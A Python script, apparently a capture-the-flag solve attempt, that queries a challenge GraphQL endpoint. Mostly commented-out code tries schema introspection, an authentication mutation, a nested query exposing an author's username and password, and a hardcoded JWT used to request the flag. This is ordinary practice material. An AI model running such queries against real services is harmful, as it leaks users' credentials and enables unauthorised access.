import requests
import json

BASE_URL = "http://challenge.ctf.games:32389/"
API = BASE_URL + "graphql"

def query(q):
    data = {'query': q}
    headers = {'Content-type': 'application/json'}
    response = requests.post(API, headers=headers, json=data)
    content = json.loads(response.content.decode()) 
    r = json.dumps(content, indent=2)
    print(r)


# query('{\n  __schema {\n    queryType {\n      fields {\n        name\n        description\n      }\n    }\n  }\n}')
query('{\n  post \n}')
query('{\n  posts \n}')
# query('mutation {authenticateUser(username:"temp", password:"temp"){user{username,password},token}}')
# data = {"query": }
# data = {"query": '{\n  flag \n}'}

# headers = {'Content-type': 'application/json'}
# response = requests.post(API, headers=headers, json=data)
# content = json.loads(response.content.decode()) 
# print(json.dumps(content, indent=2))

# data = {"query": 'mutation {authenticateUser(username:"temp",password:"temp"){user{username,password},token}}'}
# headers = {'Content-type': 'application/json'}
# response = requests.post(API, headers=headers, json=data)
# js = json.loads(response.content)
# token = js["data"]["authenticateUser"]["token"]
# print(token)

# data = {"query": 'query {post(name:"Strawberry Cake"){author{username,password}}}'}
# print(data)
# headers = {'Content-type': 'application/json'}
# response = requests.post(API, headers=headers, json=data)
# print(response.content)
# token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIxMjUwMTgsImlhdCI6MTYzMTk0MjIxNywiaXNzIjoiQ29uZ29uNHRvciJ9.eBCSVzNDz54vcsrdxL4GiokEifaPkRtTiOize3e8XQg"
# headers = {'Content-type': 'application/json', "Authorization": "JWT " + token}
# data = {"query": 'query {flag}'}
# print(data)
# headers = {'Content-type': 'application/json'}
# response = requests.post(API, headers=headers, json=data)
# print(response.content)
